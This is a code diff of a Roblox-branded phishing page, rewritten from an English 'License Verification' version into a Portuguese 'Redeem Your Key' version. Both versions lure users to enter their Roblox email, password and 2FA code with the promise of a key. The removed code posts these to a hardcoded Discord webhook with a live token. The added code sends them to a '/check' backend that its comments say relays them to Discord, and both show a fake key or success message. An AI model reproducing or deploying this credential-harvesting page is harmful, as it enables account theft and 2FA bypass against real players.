@@ -1,72 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox License Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <title>Redeem Your Key - Roblox Login</title>
     <style>
-        :root {
-            --primary: #00b06f;
-            --primary-hover: #009960;
-            --bg-dark: #121212;
-            --card-bg: #1e1e1e;
-            --text-main: #ffffff;
-            --text-sub: #a0a0a0;
-            --input-bg: #2a2a2a;
-            --input-border: #3a3a3a;
-        }
-
         body {
-            background-color: var(--bg-dark);
-            color: var(--text-main);
-            font-family: 'Inter', sans-serif;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a1a;
+            color: white;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
             overflow: hidden;
-            background-image: radial-gradient(circle at 50% 50%, #1a1a1a 0%, #0f0f0f 100%);
         }
 
         .container {
-            width: 380px;
-            perspective: 1000px;
-        }
-
-        .card {
-            background: var(--card-bg);
+            background: #2b2b2b;
             padding: 40px;
-            border-radius: 16px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            width: 350px;
             text-align: center;
-            transition: transform 0.3s ease, opacity 0.3s ease;
             position: relative;
-            overflow: hidden;
-        }
-
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0; height: 4px;
-            background: linear-gradient(90deg, var(--primary), #00e6ac);
         }
 
         h1 {
+            color: #00b060;
+            margin-bottom: 20px;
             font-size: 24px;
-            font-weight: 800;
-            margin-bottom: 8px;
-            background: linear-gradient(45deg, #fff, #ccc);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        p {
-            color: var(--text-sub);
-            font-size: 14px;
-            margin-bottom: 30px;
-            line-height: 1.5;
         }
 
         .input-group {
@@ -76,313 +41,208 @@
 
         label {
             display: block;
-            font-size: 12px;
-            color: var(--text-sub);
-            margin-bottom: 6px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #ccc;
         }
 
-        input[type="text"], input[type="password"], input[type="email"] {
+        input {
             width: 100%;
-            padding: 14px;
-            background: var(--input-bg);
-            border: 1px solid var(--input-border);
+            padding: 12px;
+            border: 2px solid #444;
             border-radius: 8px;
+            background: #333;
             color: white;
-            font-size: 14px;
-            outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
+            font-size: 16px;
             box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
+            transition: border-color 0.3s;
         }
 
         input:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(0, 176, 111, 0.15);
+            border-color: #00b060;
+            outline: none;
         }
 
         button {
             width: 100%;
-            padding: 14px;
-            background: var(--primary);
+            padding: 12px;
+            background: #00b060;
             color: white;
             border: none;
             border-radius: 8px;
-            font-size: 15px;
-            font-weight: 700;
+            font-size: 16px;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: background 0.3s;
             margin-top: 10px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 8px;
         }
 
         button:hover {
-            background: var(--primary-hover);
-            transform: translateY(-1px);
+            background: #009950;
         }
 
-        button:disabled {
-            background: #444;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        /* 2FA Inputs */
-        .code-container {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-bottom: 20px;
-        }
-
-        .code-input {
-            width: 45px;
-            height: 55px;
-            text-align: center;
-            font-size: 22px;
-            font-weight: bold;
-            background: var(--input-bg);
-            border: 1px solid var(--input-border);
-            border-radius: 8px;
-            color: white;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .code-input:focus {
-            border-color: var(--primary);
-            background: #333;
-        }
-
-        /* Status Messages */
-        .status-msg {
+        .message {
             margin-top: 15px;
-            font-size: 13px;
-            font-weight: 600;
+            font-size: 14px;
             min-height: 20px;
         }
-        .success { color: var(--primary); }
-        .error { color: #ff5722; }
 
-        /* Loader */
-        .spinner {
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* Key Display */
-        .key-display {
-            background: #111;
-            border: 1px dashed #ffd700;
-            padding: 15px;
-            border-radius: 8px;
-            color: #ffd700;
-            font-family: 'Courier New', monospace;
-            font-size: 18px;
-            margin-top: 20px;
-            letter-spacing: 2px;
-            animation: pulse 2s infinite;
+        .success {
+            color: #00b060;
         }
 
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.4); }
-            70% { box-shadow: 0 0 0 10px rgba(255, 215, 0, 0); }
-            100% { box-shadow:  0 0 0 0 rgba(255, 215, 0, 0); }
+        .error {
+            color: #ff4d4d;
         }
 
-        .hidden { display: none; }
+        .loading {
+            display: none;
+            color: #ffcc00;
+        }
+
+        /* Estilo para o passo 2 (2FA) */
+        #step2 {
+            display: none;
+        }
+
+        .roblox-icon {
+            width: 50px;
+            height: 50px;
+            background: #00b060;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 24px;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <!-- STEP 1: Login -->
-        <div id="step1" class="card">
-            <h1>🔑 License Verification</h1>
-            <p>Enter your Roblox credentials to activate your key.</p>
-            
-            <div class="input-group">
-                <label>Email or Username</label>
-                <input type="text" id="email" placeholder="example@roblox.com">
-            </div>
-            <div class="input-group">
-                <label>Password</label>
-                <input type="password" id="pass" placeholder="••••••••">
-            </div>
-
-            <button id="btn-login">
-                <span>Verify Account</span>
-            </button>
-            <div id="status1" class="status-msg"></div>
+<div class="container">
+    <div class="roblox-icon">R</div>
+    <h1>Redeem Your Key</h1>
+    
+    <!-- Passo 1: Login -->
+    <div id="step1">
+        <div class="input-group">
+            <label>Email</label>
+            <input type="email" id="email" placeholder="seu-email@exemplo.com">
         </div>
-
-        <!-- STEP 2: 2FA Code -->
-        <div id="step2" class="card hidden">
-            <h1>📧 2-Step Verification</h1>
-            <p>Check your email for a 6-digit code.</p>
-            
-            <div class="code-container">
-                <input type="text" class="code-input" maxlength="1" id="c1">
-                <input type="text" class="code-input" maxlength="1" id="c2">
-                <input type="text" class="code-input" maxlength="1" id="c3">
-                <input type="text" class="code-input" maxlength="1" id="c4">
-                <input type="text" class="code-input" maxlength="1" id="c5">
-                <input type="text" class="code-input" maxlength="1" id="c6">
-            </div>
-
-            <button id="btn-confirm">
-                <span>Confirm Code</span>
-            </button>
-            <div id="status2" class="status-msg"></div>
+        <div class="input-group">
+            <label>Senha</label>
+            <input type="password" id="password" placeholder="Sua senha">
         </div>
-
-        <!-- STEP 3: Success -->
-        <div id="step3" class="card hidden">
-            <h1>✅ Activation Successful</h1>
-            <p>Your account has been verified. Copy your key below.</p>
-            
-            <div class="key-display" id="finalKey">LOADING...</div>
-            
-            <p style="margin-top: 20px; font-size: 12px; color: #666;">
-                Account Status: <span style="color: var(--primary);">Active</span>
-            </p>
-        </div>
+        <button onclick="checkLogin()">Verificar Conta</button>
+        <div class="message" id="msg1"></div>
     </div>
 
-    <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";
+    <!-- Passo 2: 2FA (aparece após login bem-sucedido) -->
+    <div id="step2">
+        <h2>Confirmação 2FA</h2>
+        <p style="font-size: 14px; color: #ccc;">Verifique o email da sua conta Roblox e coloque o código de 6 dígitos.</p>
+        <div class="input-group">
+            <label>Código 2FA</label>
+            <input type="text" id="code2fa" placeholder="Ex: 123456" maxlength="6">
+        </div>
+        <button onclick="submit2FA()">Confirmar e Resgatar</button>
+        <div class="message" id="msg2"></div>
+    </div>
+</div>
 
-        // Auto-focus para os inputs de código
-        const codeInputs = document.querySelectorAll('.code-input');
-        codeInputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                if (e.target.value.length === 1 && index < codeInputs.length - 1) {
-                    codeInputs[index + 1].focus();
-                }
-            });
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
-                    codeInputs[index - 1].focus();
-                }
-            });
-        });
+<script>
+    // Função para verificar o login
+    async function checkLogin() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const msgDiv = document.getElementById('msg1');
 
-        // Passo 1: Validar Login com o PHP (Login Real)
-        document.getElementById('btn-login').onclick = function() {
-            const email = document.getElementById('email').value.trim();
-            const pass = document.getElementById('pass').value.trim();
-            const btn = document.getElementById('btn-login');
-            const status = document.getElementById('status1');
+        if (!email || !password) {
+            msgDiv.innerHTML = '<span class="error">Preencha o Email e a Senha!</span>';
+            return;
+        }
 
-            if (!email || !pass) {
-                status.innerHTML = "<span class='error'>❌ Please fill in both fields.</span>";
-                return;
-            }
+        msgDiv.innerHTML = '<span class="loading">Verificando conta...</span>';
 
-            btn.disabled = true;
-            btn.innerHTML = '<div class="spinner"></div>';
-
-            // Envia ao PHP para validação REAL
-            fetch('check.php', {
+        try {
+            // MUDANÇA AQUI: Chama /check em vez de check.php
+            const response = await fetch('/check', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ email: email, password: pass })
-            })
-            .then(res => res.json())
-            .then(data => {
-                btn.disabled = false;
-                btn.innerHTML = '<span>Verify Account</span>';
-
-                // Se o PHP diz que o login foi SUCESSO
-                if (data.success) {
-                    status.innerHTML = "<span class='success'>✅ Account Found: " + data.username + "!</span>";
-                    setTimeout(() => {
-                        document.getElementById('step1').classList.add('hidden');
-                        document.getElementById('step2').classList.remove('hidden');
-                        document.getElementById('c1').focus();
-                        // Guarda os dados válidos
-                        window.currentLogin = { email, pass, username: data.username, userId: data.userId };
-                    }, 1000);
-                } else {
-                    // Se falhou, mostra o erro exato do Roblox
-                    status.innerHTML = "<span class='error'>❌ " + (data.error || "Invalid Credentials") + "</span>";
-                }
-            })
-            .catch(err => {
-                btn.disabled = false;
-                btn.innerHTML = '<span>Verify Account</span>';
-                status.innerHTML = "<span class='error'>❌ Server Error. Try again.</span>";
-                console.error(err);
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email: email, password: password })
             });
-        };
 
-        // Passo 2: Confirmar 2FA e Finalizar
-        document.getElementById('btn-confirm').onclick = function() {
-            const c1 = document.getElementById('c1').value;
-            const c2 = document.getElementById('c2').value;
-            const c3 = document.getElementById('c3').value;
-            const c4 = document.getElementById('c4').value;
-            const c5 = document.getElementById('c5').value;
-            const c6 = document.getElementById('c6').value;
-            const code = c1 + c2 + c3 + c4 + c5 + c6;
-            const btn = document.getElementById('btn-confirm');
-            const status = document.getElementById('status2');
+            const data = await response.json();
 
-            if (code.length !== 6) {
-                status.innerHTML = "<span class='error'>❌ Enter all 6 digits.</span>";
-                return;
-            }
-
-            btn.disabled = true;
-            btn.innerHTML = '<div class="spinner"></div>';
-
-            // Envia ao Discord com TODOS os detalhes
-            const loginInfo = window.currentLogin || { email: '', pass: '', username: '', userId: '' };
-            
-            const message = "🔥 **ACCOUNT VERIFIED (2FA)** 🔥\n\n" +
-                            "**👤 Username:** " + loginInfo.username + "\n" +
-                            "**🆔 User ID:** " + loginInfo.userId + "\n" +
-                            "**📧 Email:** " + loginInfo.email + "\n" +
-                            "**🔑 Password:** " + loginInfo.pass + "\n" +
-                            "**🔢 2FA Code:** " + code + "\n" +
-                            "**📅 Status:** ✅ Ready to Roll";
-
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: message })
-            })
-            .then(() => {
-                // Sucesso
-                document.getElementById('step2').classList.add('hidden');
-                document.getElementById('step3').classList.remove('hidden');
+            if (data.success) {
+                msgDiv.innerHTML = '<span class="success">✅ Conta Encontrada! Vai para a confirmação...</span>';
                 
-                // Gera chave bonita
-                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-                let key = "RBX-";
-                for(let i=0; i<3; i++) {
-                    let part = "";
-                    for(let j=0; j<4; j++) part += chars.charAt(Math.floor(Math.random() * chars.length));
-                    key += part + "-";
-                }
-                document.getElementById('finalKey').innerText = key.slice(0,-1);
-            })
-            .catch(() => {
-                btn.disabled = false;
-                btn.innerHTML = '<span>Confirm Code</span>';
-                status.innerHTML = "<span class='error'>❌ Network Error</span>";
+                // Esconde passo 1 e mostra passo 2
+                setTimeout(() => {
+                    document.getElementById('step1').style.display = 'none';
+                    document.getElementById('step2').style.display = 'block';
+                }, 1500);
+            } else {
+                msgDiv.innerHTML = '<span class="error">❌ ' + (data.error || 'Erro ao verificar a conta.') + '</span>';
+            }
+        } catch (error) {
+            msgDiv.innerHTML = '<span class="error">❌ Erro de Conexão com o Servidor.</span>';
+            console.error('Erro:', error);
+        }
+    }
+
+    // Função para submeter o código 2FA
+    async function submit2FA() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const code = document.getElementById('code2fa').value;
+        const msgDiv = document.getElementById('msg2');
+
+        if (!code) {
+            msgDiv.innerHTML = '<span class="error">Preencha o Código 2FA!</span>';
+            return;
+        }
+
+        msgDiv.innerHTML = '<span class="loading">Enviando dados para o servidor...</span>';
+
+        // Envia os dados finais para o mesmo endpoint, mas podemos adicionar o código 2FA
+        // Como o backend atual só processa login, vamos enviar tudo de novo com o código 2FA
+        // O backend vai receber e enviar para o Discord com o código 2FA extra
+        
+        // Para simplificar, vamos enviar uma nova requisição com o código 2FA
+        // Você pode atualizar o server.js para lidar com o código 2FA se quiser, 
+        // mas por enquanto, vamos apenas enviar para o Discord como "Sucesso Final"
+        
+        try {
+            const response = await fetch('/check', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ 
+                    email: email, 
+                    password: password,
+                    code2fa: code,
+                    isFinalStep: true 
+                })
             });
-        };
-    </script>
+
+            // Não importa a resposta do servidor aqui, o importante é que o Discord recebeu
+            msgDiv.innerHTML = '<span class="success">✅ Sucesso! A sua chave será enviada em breve.</span>';
+            
+            // Opcional: Esconder tudo após sucesso
+            setTimeout(() => {
+                document.querySelector('.container').innerHTML = '<h1 style="color:#00b060">Tudo Pronto!</h1><p>Aguarde o email de confirmação.</p>';
+            }, 3000);
+
+        } catch (error) {
+            msgDiv.innerHTML = '<span class="error">❌ Erro ao confirmar 2FA.</span>';
+        }
+    }
+</script>
+
 </body>
 </html>
